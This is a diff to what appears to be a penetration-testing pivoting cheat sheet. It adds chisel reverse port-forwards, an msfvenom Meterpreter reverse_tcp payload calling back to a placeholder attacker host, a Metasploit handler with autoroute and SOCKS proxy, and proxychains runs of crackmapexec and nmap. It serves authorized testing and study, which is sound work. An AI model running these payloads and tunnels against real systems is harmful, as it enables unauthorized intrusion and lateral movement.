@@ -371,6 +371,17 @@ proxychains nmap -vvv -sT -Pn -n --top-ports=20 {{TARGET_IP}}
 > `R:socks` = **reverse** SOCKS (proxy opens on the *server*, i.e. Kali). Everything sent to
 > 127.0.0.1:1080 is encapsulated as HTTP, pushed up the tunnel, and forwarded by the client.
 
+Single **port** (not SOCKS) reverse-forward — expose one internal service on a Kali port, handy for a
+stable browser session to an internal web app (`R:localport:remotehost:remoteport`):
+
+```bash
+/tmp/chisel client {{LHOST}}:8080 R:80:{{TARGET_IP}}:80     # Linux pivot  — Kali:80 -> {{TARGET_IP}}:80
+```
+
+```cmd
+chisel.exe client {{LHOST}}:8080 R:80:{{TARGET_IP}}:80      :: Windows pivot (upload chisel.exe first)
+```
+
 ## D.2 — DNS tunnelling with dnscat2
 
 When even HTTP is blocked but the network resolves **DNS**, tunnel over DNS. **dnscat2** runs a
@@ -459,6 +470,59 @@ autossh -M 0 -f -N -R 9998 {{USERNAME}}@{{LHOST}} \
 > **chisel** already retries on its own, which is why it's the go-to for anything long-running.
 > **netsh portproxy** persists across reboots (great for durability — but *remember to clean it up*,
 > see §C.3). For quick exam pivots you mostly just need #1 and #2: stable foothold + backgrounded tunnel.
+
+---
+
+# F — Metasploit pivoting (autoroute + SOCKS)
+
+When your foothold is a **Meterpreter** session, Metasploit can route Kali's traffic through it with
+no separate tunnel binary — reach for this when you already caught a Meterpreter shell (otherwise
+chisel/ssh are lighter). Equivalent to `ssh -D` / chisel `R:socks`.
+
+Stage a Meterpreter payload and catch it (keep the handler up for repeat sessions):
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{LHOST}} LPORT=443 -f exe -o met.exe
+```
+
+```
+msf6 > use multi/handler
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST {{LHOST}}
+msf6 exploit(multi/handler) > set LPORT 443
+msf6 exploit(multi/handler) > set ExitOnSession false        # survive multiple incoming sessions
+msf6 exploit(multi/handler) > run -j                          # background the handler
+```
+
+Add routes to the internal subnet (autoroute reads them from the session), then stand up SOCKS:
+
+```
+msf6 > use multi/manage/autoroute
+msf6 post(multi/manage/autoroute) > set session 1
+msf6 post(multi/manage/autoroute) > run                       # auto-adds the host's subnets as routes
+
+msf6 > use auxiliary/server/socks_proxy
+msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
+msf6 auxiliary(server/socks_proxy) > set VERSION 5
+msf6 auxiliary(server/socks_proxy) > run -j                   # SOCKS5 on 127.0.0.1:1080
+```
+
+Point proxychains at `socks5 127.0.0.1 1080` and drive tools through it (`-sT -Pn` for nmap):
+
+```bash
+tail /etc/proxychains4.conf                                   # last line:  socks5 127.0.0.1 1080
+proxychains -q crackmapexec smb {{TARGET_IP}} -u {{USERNAME}} -p {{PASSWORD}} --shares
+proxychains -q nmap -sT -Pn -p 80,443,445 {{TARGET_IP}}
+```
+
+Upload files over the same session (e.g. stage chisel for a browser-stable port-forward):
+
+```
+meterpreter > upload chisel.exe C:\\Users\\Public\\chisel.exe
+```
+
+> Same proxychains rules apply (SOCKS is TCP-only → `-sT -Pn`, be patient). For a firewalled / DPI
+> egress path, prefer **chisel** (§D.1) — it looks like HTTP and auto-reconnects.
 
 ---
 
